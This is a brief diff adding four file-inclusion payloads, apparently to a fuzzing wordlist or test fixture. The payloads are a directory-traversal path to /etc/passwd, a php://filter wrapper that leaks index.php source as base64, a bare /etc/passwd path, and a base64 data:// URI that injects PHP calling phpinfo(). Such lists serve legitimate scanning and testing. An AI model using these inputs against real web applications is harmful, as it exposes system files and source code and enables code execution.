@@ -1,0 +1,4 @@
+../../../../etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+/etc/passwd
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
